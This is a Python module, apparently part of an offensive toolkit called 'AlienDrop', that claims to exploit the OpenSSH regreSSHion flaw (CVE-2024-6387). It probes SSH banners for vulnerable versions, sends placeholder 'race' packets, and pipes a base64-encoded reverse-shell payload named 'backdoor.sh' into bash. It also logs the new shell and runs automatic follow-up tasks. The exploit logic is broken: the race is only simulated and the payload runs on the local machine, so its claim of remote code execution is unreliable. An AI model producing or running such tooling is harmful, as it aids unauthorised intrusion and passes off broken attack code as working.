# MINC - CVE-2024-6387 (RegreSSHion - In-Memory SSH Stdin Shell Loader for AlienDrop)

import socket
import subprocess
from modules.encrypt_module import generate_payload_blob
from modules.cdn_rotator import get_current_cdn_url
from modules.idgen import gen_shell_id
from modules import shell_logger
from random import randint
import base64
import time

try:
    from modules import shell_tasks
    AUTOTASKS_ENABLED = True
except ImportError:
    AUTOTASKS_ENABLED = False

SHELL_NAME = "backdoor.sh"
RCE_PORT = 22
DEFAULT_USER = "root"
VULN_VERSION_RANGE = ("8.5", "9.2")


def check_openssh_version(target):
    try:
        banner = socket.create_connection((target, RCE_PORT), timeout=5).recv(1024).decode()
        if "OpenSSH" in banner:
            version = banner.split("OpenSSH_")[1].split()[0]
            print(f"[CVE-6387] OpenSSH version detected: {version}")
            return version
    except:
        pass
    return None


def version_is_vulnerable(version):
    try:
        from packaging import version as v
        return v.parse(VULN_VERSION_RANGE[0]) <= v.parse(version) <= v.parse(VULN_VERSION_RANGE[1])
    except:
        return False


def run(target, recon_data=None):
    print(f"[CVE-6387] Preparing RegreSSHion memory-only exploit on {target}:{RCE_PORT}...")

    openssh_version = check_openssh_version(target)
    if openssh_version and not version_is_vulnerable(openssh_version):
        print(f"[CVE-6387] OpenSSH version {openssh_version} is not vulnerable.")
        return False

    # Simulate race trigger with multiple timing attempts
    for i in range(3):
        try:
            s = socket.create_connection((target, RCE_PORT), timeout=4)
            s.send(b"\x00" * 512)
            s.close()
            time.sleep(0.4)
            print(f"[CVE-6387] Race attempt {i+1}/3 dispatched.")
        except:
            continue

    print(f"[CVE-6387] Triggering in-memory reverse shell injection via base64 stream...")

    try:
        shell_id = gen_shell_id()
        raw_payload = generate_payload_blob(SHELL_NAME, drop_type="reverse_shell")

        # Create base64-encoded memory dropper
        encoded = base64.b64encode(raw_payload).decode()
        memory_pipe = f"echo {encoded} | base64 -d | bash"

        print(f"[CVE-6387] Sending memory loader payload via stdin simulation...")

        subprocess.run(memory_pipe, shell=True, timeout=6)

        shell_logger.log_shell_report(
            shell_id=shell_id,
            tags=["cve-6387", "linux", "openssh", "rce", "memory"],
            tasks=["reverse_shell"],
            metadata={
                "target": target,
                "version": openssh_version or "unknown",
                "exec_method": "stdin_base64_pipe"
            }
        )

        if AUTOTASKS_ENABLED:
            shell_tasks.run_auto_tasks(shell_id, task_profile="reverse_shell")

        return True

    except Exception as e:
        print(f"[CVE-6387] Memory-based dropper failed: {e}")
        return False

